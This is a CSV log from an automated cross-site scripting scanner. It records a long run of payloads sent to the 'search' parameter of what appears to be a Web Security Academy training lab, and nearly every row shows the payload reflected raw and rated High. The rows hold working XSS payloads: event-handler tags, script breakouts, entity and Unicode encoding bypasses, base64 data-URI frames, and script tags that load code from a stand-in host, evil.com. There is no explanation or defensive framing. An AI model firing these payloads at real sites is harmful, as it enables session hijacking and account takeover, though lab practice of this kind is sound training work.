Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:01:46.426,2026-01-10 16:01:46.744,0.318,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,No,,High
2026-01-10 16:01:46.744,2026-01-10 16:01:47.065,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,No,,High
2026-01-10 16:01:47.065,2026-01-10 16:01:47.316,0.251,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,No,,High
2026-01-10 16:01:47.316,2026-01-10 16:01:47.544,0.228,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,No,,High
2026-01-10 16:01:47.544,2026-01-10 16:01:47.866,0.322,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,No,,High
2026-01-10 16:01:47.866,2026-01-10 16:01:48.067,0.201,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,No,,High
2026-01-10 16:01:48.067,2026-01-10 16:01:48.345,0.278,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,No,,High
2026-01-10 16:01:48.345,2026-01-10 16:01:48.665,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,No,,High
2026-01-10 16:01:48.665,2026-01-10 16:01:48.885,0.220,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,No,,High
2026-01-10 16:01:48.885,2026-01-10 16:01:49.145,0.260,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<section onmouseover=alert(1)>X</section>,RAW_REFLECTION,No,,High
2026-01-10 16:01:49.145,2026-01-10 16:01:49.465,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,No,,High
2026-01-10 16:01:49.465,2026-01-10 16:01:49.785,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,No,,High
2026-01-10 16:01:49.785,2026-01-10 16:01:50.105,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<figcaption onmouseover=alert(1)>X</figcaption>,RAW_REFLECTION,No,,High
2026-01-10 16:01:50.105,2026-01-10 16:01:50.425,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,No,,High
2026-01-10 16:01:50.425,2026-01-10 16:01:50.745,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,No,,High
2026-01-10 16:01:50.745,2026-01-10 16:01:51.065,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,No,,High
2026-01-10 16:01:51.065,2026-01-10 16:01:51.385,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,No,,High
2026-01-10 16:01:51.385,2026-01-10 16:01:51.582,0.197,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,No,,High
2026-01-10 16:01:51.582,2026-01-10 16:01:51.782,0.199,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<button onclick=alert(1)>X</button>,RAW_REFLECTION,No,,High
2026-01-10 16:01:51.782,2026-01-10 16:01:51.981,0.199,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<button ondblclick=alert(1)>X</button>,RAW_REFLECTION,No,,High
2026-01-10 16:01:51.981,2026-01-10 16:01:52.192,0.211,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<button onmousedown=alert(1)>X</button>,RAW_REFLECTION,No,,High
2026-01-10 16:01:52.192,2026-01-10 16:01:52.383,0.191,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<button onmouseup=alert(1)>X</button>,RAW_REFLECTION,No,,High
2026-01-10 16:01:52.383,2026-01-10 16:01:52.665,0.282,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"""><script>alert(1)</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:52.665,2026-01-10 16:01:52.823,0.158,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,'><script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:52.823,2026-01-10 16:01:52.998,0.175,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"""></script><script>alert(1)</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:52.998,2026-01-10 16:01:53.303,0.306,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,';alert(1);//,RAW_REFLECTION,No,,High
2026-01-10 16:01:53.303,2026-01-10 16:01:53.496,0.193,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,""";alert(1);//",RAW_REFLECTION,No,,High
2026-01-10 16:01:53.496,2026-01-10 16:01:53.784,0.288,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,""" onmouseover=alert(1) x=""",RAW_REFLECTION,No,,High
2026-01-10 16:01:53.784,2026-01-10 16:01:54.105,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"""onmouseover=""alert(1)",RAW_REFLECTION,No,,High
2026-01-10 16:01:54.105,2026-01-10 16:01:54.424,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,' onmouseover=alert(1) x=',RAW_REFLECTION,No,,High
2026-01-10 16:01:54.424,2026-01-10 16:01:54.744,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,No,,High
2026-01-10 16:01:54.744,2026-01-10 16:01:55.064,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,No,,High
2026-01-10 16:01:55.064,2026-01-10 16:01:55.384,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,</script><script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:55.384,2026-01-10 16:01:55.704,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:55.704,2026-01-10 16:01:56.024,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,</script><svg onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:56.024,2026-01-10 16:01:56.217,0.193,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,--><script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:56.217,2026-01-10 16:01:56.418,0.200,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,--!><script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:56.418,2026-01-10 16:01:56.606,0.188,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/oncut=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:56.606,2026-01-10 16:01:56.802,0.196,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onclick=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:56.802,2026-01-10 16:01:57.001,0.199,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/ondrag=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:57.001,2026-01-10 16:01:57.303,0.302,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onerror=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:57.303,2026-01-10 16:01:57.626,0.323,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:01:57.626,2026-01-10 16:01:57.942,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:01:57.942,2026-01-10 16:01:58.268,0.326,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:01:58.268,2026-01-10 16:01:58.501,0.233,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:01:58.501,2026-01-10 16:01:58.719,0.218,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:01:58.719,2026-01-10 16:01:58.945,0.226,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,No,,High
2026-01-10 16:01:58.945,2026-01-10 16:01:59.223,0.278,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:59.223,2026-01-10 16:01:59.544,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=alert(1) onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:59.544,2026-01-10 16:01:59.868,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,No,,High
2026-01-10 16:01:59.868,2026-01-10 16:02:00.187,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,No,,High
2026-01-10 16:02:00.187,2026-01-10 16:02:00.502,0.315,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,No,,High
2026-01-10 16:02:00.502,2026-01-10 16:02:00.827,0.325,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<video poster=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:00.827,2026-01-10 16:02:01.143,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<html manifest=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:01.143,2026-01-10 16:02:01.466,0.323,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,No,,High
2026-01-10 16:02:01.466,2026-01-10 16:02:01.783,0.317,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:01.783,2026-01-10 16:02:02.103,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:02.103,2026-01-10 16:02:02.311,0.209,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:02:02.311,2026-01-10 16:02:02.583,0.271,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a href=about:blank>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:02:02.583,2026-01-10 16:02:02.903,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:02:02.903,2026-01-10 16:02:03.223,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:02:03.223,2026-01-10 16:02:03.386,0.164,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,No,,High
2026-01-10 16:02:03.386,2026-01-10 16:02:03.556,0.170,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:02:03.556,2026-01-10 16:02:03.863,0.306,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,No,,High
2026-01-10 16:02:03.863,2026-01-10 16:02:04.181,0.318,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,No,,High
2026-01-10 16:02:04.181,2026-01-10 16:02:04.503,0.322,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,No,,High
2026-01-10 16:02:04.503,2026-01-10 16:02:04.823,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:04.823,2026-01-10 16:02:05.143,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:05.143,2026-01-10 16:02:05.375,0.232,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,No,,High
2026-01-10 16:02:05.375,2026-01-10 16:02:05.622,0.248,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,No,,High
2026-01-10 16:02:05.623,2026-01-10 16:02:05.941,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,No,,High
2026-01-10 16:02:05.941,2026-01-10 16:02:06.168,0.226,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,No,,High
2026-01-10 16:02:06.168,2026-01-10 16:02:06.421,0.253,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,No,,High
2026-01-10 16:02:06.421,2026-01-10 16:02:06.745,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,No,,High
2026-01-10 16:02:06.745,2026-01-10 16:02:07.062,0.317,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,No,,High
2026-01-10 16:02:07.062,2026-01-10 16:02:07.381,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,No,,High
2026-01-10 16:02:07.381,2026-01-10 16:02:07.664,0.282,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,No,,High
2026-01-10 16:02:07.664,2026-01-10 16:02:07.865,0.201,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,No,,High
2026-01-10 16:02:07.865,2026-01-10 16:02:08.182,0.317,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<image src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:08.182,2026-01-10 16:02:08.503,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:08.503,2026-01-10 16:02:08.822,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:08.822,2026-01-10 16:02:09.142,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<applet code=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:09.142,2026-01-10 16:02:09.328,0.186,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>al\u0065rt(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:09.328,2026-01-10 16:02:09.575,0.246,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>al\x65rt(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:09.575,2026-01-10 16:02:09.781,0.206,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:09.781,2026-01-10 16:02:10.102,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:10.102,2026-01-10 16:02:10.422,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>[1].find(alert)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:10.422,2026-01-10 16:02:10.713,0.292,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:10.713,2026-01-10 16:02:10.905,0.191,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:10.905,2026-01-10 16:02:11.222,0.317,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:11.222,2026-01-10 16:02:11.409,0.187,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,No,,High
2026-01-10 16:02:11.409,2026-01-10 16:02:11.596,0.186,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,No,,High
2026-01-10 16:02:11.596,2026-01-10 16:02:11.861,0.266,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,RAW_REFLECTION,No,,High
2026-01-10 16:02:11.861,2026-01-10 16:02:12.181,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:12.182,2026-01-10 16:02:12.502,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:02:12.502,2026-01-10 16:02:12.835,0.334,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script/src=//evil.com></script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:12.835,2026-01-10 16:02:13.140,0.305,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script	src=//evil.com></script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:13.140,2026-01-10 16:02:13.460,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
2026-01-10 16:02:13.460,2026-01-10 16:02:13.781,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,src=//evil.com></script>,RAW_REFLECTION,No,,High
2026-01-10 16:02:13.781,2026-01-10 16:02:14.101,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,No,,High
2026-01-10 16:02:14.101,2026-01-10 16:02:14.267,0.166,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,No,,High
2026-01-10 16:02:14.267,2026-01-10 16:02:14.433,0.165,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,No,,High
2026-01-10 16:02:14.433,2026-01-10 16:02:14.597,0.164,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,No,,High
2026-01-10 16:02:14.597,2026-01-10 16:02:14.901,0.304,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,No,,High
2026-01-10 16:02:14.901,2026-01-10 16:02:15.221,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,No,,High
2026-01-10 16:02:15.221,2026-01-10 16:02:15.540,0.318,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,No,,High
2026-01-10 16:02:15.540,2026-01-10 16:02:15.861,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,No,,High
2026-01-10 16:02:15.861,2026-01-10 16:02:16.181,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:16.181,2026-01-10 16:02:16.500,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:16.500,2026-01-10 16:02:16.687,0.187,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:16.687,2026-01-10 16:02:16.981,0.294,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:16.981,2026-01-10 16:02:17.304,0.323,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:17.304,2026-01-10 16:02:17.621,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:17.621,2026-01-10 16:02:17.940,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:17.941,2026-01-10 16:02:18.260,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:18.260,2026-01-10 16:02:18.585,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:18.585,2026-01-10 16:02:18.778,0.194,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:18.778,2026-01-10 16:02:19.060,0.282,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=month onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:19.060,2026-01-10 16:02:19.380,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:19.380,2026-01-10 16:02:19.700,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:19.700,2026-01-10 16:02:20.020,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:02:20.020,2026-01-10 16:02:20.216,0.196,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=button onclick=alert(1) value=X>,RAW_REFLECTION,No,,High
2026-01-10 16:02:20.216,2026-01-10 16:02:20.434,0.218,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,No,,High
